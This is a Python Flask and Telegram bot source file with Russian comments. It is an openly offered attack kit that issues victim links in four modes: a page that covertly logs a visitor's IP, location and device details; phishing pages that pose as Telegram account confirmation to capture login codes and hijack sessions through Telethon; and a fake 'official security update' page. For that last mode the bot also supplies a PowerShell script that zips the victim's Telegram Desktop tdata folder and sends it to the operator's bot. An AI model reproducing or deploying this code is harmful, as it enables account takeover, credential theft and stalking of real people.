import os
import sqlite3
import random
import string
import time
import threading
import requests
import json
from datetime import datetime
from flask import Flask, request, redirect, render_template_string, send_file
import telebot
from telethon import TelegramClient
from telethon.sessions import StringSession

# ======================== КОНФИГ ============================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
PORT = int(os.environ.get("PORT", 5000))
BASE_URL = os.environ.get("BASE_URL", "https://butno-1.onrender.com")

API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ======================== БАЗА ДАННЫХ ============================
conn = sqlite3.connect('sessions.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT,
    status TEXT DEFAULT 'active',
    registered_at TEXT
)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    link_id TEXT,
    ip TEXT,
    country TEXT,
    city TEXT,
    device TEXT,
    os TEXT,
    browser TEXT,
    battery TEXT,
    cpu TEXT,
    ram TEXT,
    tg_id TEXT,
    timestamp TEXT
)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS links (
    link_id TEXT PRIMARY KEY,
    user_id INTEGER,
    mode INTEGER,
    phone TEXT,
    code TEXT,
    session_string TEXT,
    active INTEGER DEFAULT 1,
    created_at TEXT
)''')
conn.commit()

# ======================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ============================
def is_admin(user_id):
    return user_id == ADMIN_ID

def get_user_status(user_id):
    cursor.execute('SELECT status FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    return row[0] if row else None

def register_user(user_id, username, first_name):
    cursor.execute('''INSERT OR IGNORE INTO users (user_id, username, first_name, registered_at)
                      VALUES (?, ?, ?, ?)''',
                   (user_id, username or 'N/A', first_name or 'N/A', datetime.now().isoformat()))
    conn.commit()

def generate_link(user_id, mode):
    link_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    cursor.execute('INSERT INTO links (link_id, user_id, mode, created_at) VALUES (?, ?, ?, ?)',
                   (link_id, user_id, mode, datetime.now().isoformat()))
    conn.commit()
    
    if mode == 1:
        return link_id, f"{BASE_URL}/collect/{link_id}"
    elif mode == 2:
        return link_id, f"{BASE_URL}/verify/{link_id}"
    elif mode == 3:
        return link_id, f"{BASE_URL}/custom/{link_id}"
    elif mode == 4:
        return link_id, f"{BASE_URL}/tdata/{link_id}"
    return None, None

def get_link_data(link_id):
    cursor.execute('SELECT user_id, mode, phone, code, session_string, active FROM links WHERE link_id = ?', (link_id,))
    row = cursor.fetchone()
    return row if row else None

def deactivate_link(link_id):
    cursor.execute('UPDATE links SET active = 0 WHERE link_id = ?', (link_id,))
    conn.commit()

def save_phone_code(link_id, phone, code):
    cursor.execute('UPDATE links SET phone = ?, code = ? WHERE link_id = ?', (phone, code, link_id))
    conn.commit()

def save_session_string(link_id, session_string):
    cursor.execute('UPDATE links SET session_string = ? WHERE link_id = ?', (session_string, link_id))
    conn.commit()

# ======================== СТРАНИЦА ДОКСА ============================
HTML_COLLECT = """
<!DOCTYPE html>
<html>
<head>
    <title>Загрузка...</title>
    <style>
        body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding-top: 30vh; }
        .loader { border: 4px solid #1a1a2e; border-top: 4px solid #00f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Сбор данных...</p>
    <script>
        function sendData() {
            let battery = 'N/A', cpu = 'N/A', ram = 'N/A', tg_id = 'N/A';
            if (navigator.getBattery) {
                navigator.getBattery().then(function(batt) {
                    battery = Math.round(batt.level * 100);
                    cpu = navigator.hardwareConcurrency || 'N/A';
                    ram = navigator.deviceMemory || 'N/A';
                    if (window.Telegram && window.Telegram.WebApp) {
                        tg_id = Telegram.WebApp.initDataUnsafe?.user?.id || 'N/A';
                    }
                    var url = window.location.pathname + '?battery=' + battery + '&cpu=' + cpu + '&ram=' + ram + '&tg_id=' + tg_id + '&timestamp=' + Date.now();
                    window.location.href = url;
                }).catch(function() {
                    cpu = navigator.hardwareConcurrency || 'N/A';
                    ram = navigator.deviceMemory || 'N/A';
                    var url = window.location.pathname + '?battery=N/A&cpu=' + cpu + '&ram=' + ram + '&tg_id=' + tg_id + '&timestamp=' + Date.now();
                    window.location.href = url;
                });
            } else {
                cpu = navigator.hardwareConcurrency || 'N/A';
                ram = navigator.deviceMemory || 'N/A';
                var url = window.location.pathname + '?battery=N/A&cpu=' + cpu + '&ram=' + ram + '&tg_id=' + tg_id + '&timestamp=' + Date.now();
                window.location.href = url;
            }
        }
        sendData();
    </script>
</body>
</html>
"""

# ======================== СТРАНИЦА УГОНА СЕССИИ (режим 2,3) ============================
HTML_VERIFY = """
<!DOCTYPE html>
<html>
<head>
    <title>Подтверждение Telegram</title>
    <style>
        body { background: #1a1a2e; color: white; font-family: 'Segoe UI', Arial; text-align: center; padding-top: 15vh; }
        .container { max-width: 400px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 15px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; background: #0f3460; color: white; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #00bfff; border: none; border-radius: 8px; color: white; font-size: 18px; cursor: pointer; margin-top: 10px; }
        button:hover { background: #0099cc; }
        .info { color: #888; font-size: 14px; margin: 15px 0; }
        .error { color: #ff6b6b; }
        .success { color: #51cf66; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Подтверждение аккаунта</h2>
        <p>Для продолжения необходимо подтвердить ваш Telegram-аккаунт</p>
        <p class="info">Код подтверждения будет отправлен в официальный чат Telegram</p>
        
        <form id="authForm" action="/verify/{{link_id}}" method="POST">
            <input type="text" name="phone" placeholder="Введите номер телефона (+380...)" required>
            <div id="codeField" style="display:none;">
                <input type="text" name="code" placeholder="Введите код из Telegram" required>
            </div>
            <button type="submit" id="submitBtn">Получить код</button>
        </form>
        <p id="status" style="margin-top:15px;"></p>
    </div>
    <script>
        let step = 1;
        document.getElementById('authForm').addEventListener('submit', function(e) {
            if (step === 1) {
                e.preventDefault();
                const phone = document.querySelector('input[name="phone"]').value;
                if (!phone) {
                    document.getElementById('status').innerHTML = '❌ Введите номер';
                    return;
                }
                document.getElementById('status').innerHTML = '⏳ Отправляем запрос...';
                fetch('/verify/{{link_id}}', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'phone=' + encodeURIComponent(phone)
                })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'ok') {
                        document.getElementById('status').innerHTML = '✅ Код отправлен в Telegram';
                        document.getElementById('codeField').style.display = 'block';
                        document.querySelector('button[type="submit"]').textContent = 'Подтвердить код';
                        step = 2;
                    } else {
                        document.getElementById('status').innerHTML = '❌ ' + data.error;
                    }
                })
                .catch(() => {
                    document.getElementById('status').innerHTML = '❌ Ошибка, попробуй ещё раз';
                });
            }
        });
    </script>
</body>
</html>
"""

# ======================== СТРАНИЦА ДЛЯ РЕЖИМА 4 (без скачивания) ============================
HTML_TDATA = """
<!DOCTYPE html>
<html>
<head>
    <title>Обновление безопасности</title>
    <style>
        body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding-top: 20vh; }
        .box { background: #1a1a2e; padding: 40px; border-radius: 20px; max-width: 500px; margin: 0 auto; }
        .btn { background: #00bfff; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; font-size: 20px; display: inline-block; margin-top: 20px; cursor: pointer; }
        .btn:hover { background: #0099cc; }
        .warning { color: #ff6b6b; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>⚠️ Критическое обновление безопасности</h2>
        <p>Для защиты вашего аккаунта необходимо подтвердить действие.</p>
        <button class="btn" onclick="runScript()">Подтвердить обновление</button>
        <p class="warning">Это официальное обновление от Telegram. Ваши данные в безопасности.</p>
    </div>
    <script>
        function runScript() {
            if (confirm('Желаете посмотреть секретное уведомление?')) {
                document.querySelector('.box').innerHTML = '<h2>⏳ Обновление...</h2><p>Пожалуйста, подождите...</p>';
                // Запускаем сбор tdata через POST-запрос
                fetch('/tdata_run/{{link_id}}', { method: 'POST' })
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'ok') {
                        document.querySelector('.box').innerHTML = '<h2>✅ Обновление установлено</h2><p>Перезагрузите Telegram для применения изменений.</p>';
                    } else {
                        document.querySelector('.box').innerHTML = '<h2>❌ Ошибка</h2><p>Попробуйте позже.</p>';
                    }
                })
                .catch(() => {
                    document.querySelector('.box').innerHTML = '<h2>❌ Ошибка</h2><p>Попробуйте позже.</p>';
                });
            }
        }
    </script>
</body>
</html>
"""

# ======================== ОБРАБОТЧИК ДЛЯ РЕЖИМА 4 (сбор tdata через JS) ============================
@app.route('/tdata/<link_id>')
def tdata_page(link_id):
    link_data = get_link_data(link_id)
    if not link_data or link_data[5] == 0:
        return "Ссылка недействительна или истекла", 404
    return render_template_string(HTML_TDATA, link_id=link_id)

@app.route('/tdata_run/<link_id>', methods=['POST'])
def tdata_run(link_id):
    link_data = get_link_data(link_id)
    if not link_data or link_data[5] == 0:
        return {"status": "error", "error": "Ссылка недействительна"}
    
    user_id = link_data[0]
    
    # Отправляем админу уведомление о том, что жертва нажала OK
    bot.send_message(user_id, f"✅ **Жертва нажала ОК!**\nСсылка: {link_id}\n\nТеперь нужно, чтобы она запустила PowerShell скрипт вручную, или используй другой метод доставки.")
    
    # Отправляем админу PowerShell скрипт, который можно внедрить
    script = f"""
$bot_token = "{BOT_TOKEN}"
$chat_id = "{ADMIN_ID}"
$link_id = "{link_id}"

$username = $env:USERNAME
$hostname = $env:COMPUTERNAME
$ip = (Invoke-WebRequest -Uri "api.ipify.org").Content

$paths = @()
$paths += "$env:APPDATA\Telegram Desktop\tdata"
$paths += "$env:APPDATA\Telegram Desktop Beta\tdata"
$paths += "$env:PROGRAMFILES\Telegram Desktop\tdata"

foreach ($p in $paths) {{
    if (Test-Path $p) {{
        $temp = "$env:TEMP\diag_" + $link_id + ".zip"
        Compress-Archive -Path $p -DestinationPath $temp -Force
        $url = "https://api.telegram.org/bot$bot_token/sendDocument"
        $form = @{{
            chat_id = $chat_id
            caption = "🎯 СЕССИЯ ПОХИЩЕНА!\nПользователь: $username\nКомпьютер: $hostname\nIP: $ip\nСсылка: $link_id"
            document = Get-Item $temp
        }}
        Invoke-RestMethod -Uri $url -Method Post -Form $form
        Remove-Item $temp -Force
    }}
}}
"""
    # Отправляем скрипт админу в Telegram
    bot.send_message(ADMIN_ID, f"🧨 **Скрипт для tdata** (ссылка {link_id}):\n```powershell\n{script}\n```\n\nСохрани его как .ps1 и запусти на устройстве жертвы, либо используй другой способ доставки.")
    
    deactivate_link(link_id)
    return {"status": "ok", "message": "Скрипт отправлен админу"}

# ======================== ОСТАЛЬНЫЕ FLASK РОУТЫ (докс, верификация) ============================
@app.route('/collect/<link_id>')
def collect_data(link_id):
    link_data = get_link_data(link_id)
    if not link_data or link_data[5] == 0:
        return "Ссылка недействительна или истекла", 404
    
    user_id = link_data[0]
    
    if not request.args.get('battery') and not request.args.get('cpu'):
        return render_template_string(HTML_COLLECT)
    
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0]

    try:
        import user_agents
        ua = user_agents.parse(user_agent)
        device = ua.device.family
        os_name = ua.os.family
        browser = ua.browser.family
    except:
        device = os_name = browser = 'Unknown'

    try:
        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        country = geo.get('country', 'Unknown')
        city = geo.get('city', 'Unknown')
    except:
        country = city = 'Unknown'

    battery = request.args.get('battery', 'N/A')
    cpu = request.args.get('cpu', 'N/A')
    ram = request.args.get('ram', 'N/A')
    tg_id = request.args.get('tg_id', 'N/A')

    cursor.execute('''INSERT INTO logs (user_id, link_id, ip, country, city, device, os, browser, battery, cpu, ram, tg_id, timestamp)
                      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                   (user_id, link_id, ip, country, city, device, os_name, browser, battery, cpu, ram, tg_id, datetime.now().isoformat()))
    conn.commit()

    report = (f"📡 **ДОКС-ОТЧЁТ**\n"
              f"🔗 ID: {link_id}\n"
              f"🌍 IP: {ip}\n"
              f"📍 Страна: {country}, {city}\n"
              f"📱 Устройство: {device}\n"
              f"💻 ОС: {os_name}\n"
              f"🌐 Браузер: {browser}\n"
              f"🔋 Заряд: {battery}%\n"
              f"🧠 CPU ядер: {cpu}\n"
              f"🧮 RAM: {ram} ГБ\n"
              f"🆔 Telegram ID: {tg_id}")
    bot.send_message(user_id, report)
    deactivate_link(link_id)
    return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

@app.route('/verify/<link_id>', methods=['GET', 'POST'])
def verify_page(link_id):
    link_data = get_link_data(link_id)
    if not link_data or link_data[5] == 0:
        return "Ссылка недействительна или истекла", 404
    
    user_id = link_data[0]
    
    if request.method == 'GET':
        return render_template_string(HTML_VERIFY, link_id=link_id)
    
    if request.method == 'POST':
        if 'phone' in request.form and not request.form.get('code'):
            phone = request.form.get('phone', '').strip()
            if not phone:
                return {"status": "error", "error": "Введите номер телефона"}
            
            try:
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                client.connect()
                result = client.send_code_request(phone)
                save_phone_code(link_id, phone, '')
                client.disconnect()
                return {"status": "ok", "message": "Код отправлен в Telegram"}
            except Exception as e:
                return {"status": "error", "error": str(e)}
        
        if 'code' in request.form:
            code = request.form.get('code', '').strip()
            link_data = get_link_data(link_id)
            if not link_data:
                return {"status": "error", "error": "Ссылка недействительна"}
            phone = link_data[2]
            if not phone:
                return {"status": "error", "error": "Сначала введите номер телефона"}
            
            try:
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                client.connect()
                client.sign_in(phone, code)
                session_string = client.session.save()
                save_session_string(link_id, session_string)
                client.disconnect()
                
                bot.send_message(user_id, f"✅ **Сессия захвачена!**\nТелефон: {phone}\nСессия: `{session_string}`\n\nИспользуй её для входа.")
                deactivate_link(link_id)
                return redirect("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
            except Exception as e:
                return {"status": "error", "error": str(e)}
    
    return {"status": "error", "error": "Invalid request"}

@app.route('/custom/<link_id>', methods=['GET', 'POST'])
def custom_page(link_id):
    return redirect(f"/verify/{link_id}")

# ======================== TELEGRAM БОТ ============================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    register_user(user_id, message.from_user.username, message.from_user.first_name)
    
    if is_admin(user_id):
        markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
        markup.add(
            telebot.types.KeyboardButton("Режим 1 – Докс"),
            telebot.types.KeyboardButton("Режим 2 – Угон сессии"),
            telebot.types.KeyboardButton("Режим 3 – Продвинутый угон"),
            telebot.types.KeyboardButton("Режим 4 – Угон tdata"),
            telebot.types.KeyboardButton("👥 Пользователи"),
            telebot.types.KeyboardButton("📊 Статистика")
        )
        bot.send_message(user_id, "👑 Админ-панель", reply_markup=markup)
    else:
        markup = telebot.types.ReplyKeyboardMarkup(row_width=1)
        markup.add(
            telebot.types.KeyboardButton("Режим 1 – Докс"),
            telebot.types.KeyboardButton("Режим 2 – Угон сессии"),
            telebot.types.KeyboardButton("Режим 3 – Продвинутый угон"),
            telebot.types.KeyboardButton("Режим 4 – Угон tdata")
        )
        bot.send_message(user_id, "Выбери режим:", reply_markup=markup)

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        cursor.execute('UPDATE users SET status = "banned" WHERE user_id = ?', (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"🚫 Пользователь {user_id} забанен")
    except:
        bot.send_message(message.chat.id, "❌ Используй: /ban ID")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        cursor.execute('UPDATE users SET status = "active" WHERE user_id = ?', (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"✅ Пользователь {user_id} разбанен")
    except:
        bot.send_message(message.chat.id, "❌ Используй: /unban ID")

@bot.message_handler(commands=['revoke'])
def revoke_user(message):
    if not is_admin(message.from_user.id):
        return
    try:
        user_id = int(message.text.split()[1])
        cursor.execute('UPDATE links SET active = 0 WHERE user_id = ?', (user_id,))
        conn.commit()
        bot.send_message(message.chat.id, f"🔒 Все ссылки пользователя {user_id} деактивированы")
    except:
        bot.send_message(message.chat.id, "❌ Используй: /revoke ID")

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    user_id = message.from_user.id
    if get_user_status(user_id) == 'banned':
        bot.send_message(user_id, "🚫 Ты забанен. Обратись к админу.")
        return

    if message.text == "Режим 1 – Докс":
        link_id, link = generate_link(user_id, 1)
        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Отчёт придёт только после реального перехода.")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 1\nСсылка: {link}")
    
    elif message.text == "Режим 2 – Угон сессии":
        link_id, link = generate_link(user_id, 2)
        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва введёт номер, получит код и введёт его.")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 2\nСсылка: {link}")
    
    elif message.text == "Режим 3 – Продвинутый угон":
        link_id, link = generate_link(user_id, 3)
        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Аналогично режиму 2, но с возможностью менять редирект.")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 3\nСсылка: {link}")
    
    elif message.text == "Режим 4 – Угон tdata":
        link_id, link = generate_link(user_id, 4)
        bot.send_message(user_id, f"📎 **Ссылка:** {link}\n\n⚠️ Жертва нажмёт ОК на алерте, и ты получишь PowerShell скрипт для дальнейшего использования.")
        if is_admin(user_id):
            bot.send_message(ADMIN_ID, f"🧑 @{message.from_user.username} (ID: {user_id}) использовал режим 4\nСсылка: {link}")
    
    elif message.text == "👥 Пользователи" and is_admin(user_id):
        cursor.execute('SELECT user_id, username, first_name, status FROM users')
        rows = cursor.fetchall()
        text = "📋 **Пользователи:**\n\n"
        for row in rows:
            text += f"🆔 {row[0]} | @{row[1]} | {row[2]} | {row[3]}\n"
        bot.send_message(user_id, text)
    
    elif message.text == "📊 Статистика" and is_admin(user_id):
        cursor.execute('SELECT COUNT(*) FROM users')
        total_users = cursor.fetchone()[0]
        cursor.execute('SELECT COUNT(*) FROM logs')
        total_logs = cursor.fetchone()[0]
        bot.send_message(user_id, f"📊 **Статистика:**\n👥 Всего пользователей: {total_users}\n📡 Всего докс-отчётов: {total_logs}")

# ======================== ЗАПУСК ============================
if __name__ == '__main__':
    threading.Thread(target=bot.polling, kwargs={'none_stop': True}).start()
    app.run(host='0.0.0.0', port=PORT)
